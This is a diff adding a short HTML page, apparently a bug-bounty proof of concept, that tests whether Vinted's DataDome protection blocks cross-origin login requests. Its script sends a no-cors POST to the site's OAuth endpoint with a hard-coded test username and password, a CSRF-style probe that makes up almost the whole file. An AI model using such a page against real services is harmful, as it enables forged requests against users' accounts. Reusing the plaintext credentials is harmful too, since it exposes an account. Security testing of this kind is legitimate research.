@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Test DataDome + CSRF</h2>
+    <div id="status">En attente...</div>
+    
+    <script>
+        // Test si DataDome bloque les requêtes cross-origin
+        fetch('https://www.vinted.fr/web/api/auth/oauth', {
+            method: 'POST',
+            mode: 'no-cors', // Évite les erreurs CORS
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: "web",
+                scope: "user",
+                username: "raz_26+2@intigriti.me",
+                password: "Vh5:U&fGd2mk:sy",
+                grant_type: "password"
+            })
+        })
+        .then(response => {
+            document.getElementById('status').innerHTML = 
+                `DataDome a répondu avec status: ${response.status}`;
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = 
+                `Erreur DataDome: ${error.message}`;
+        });
+    </script>
+</body>
+</html>
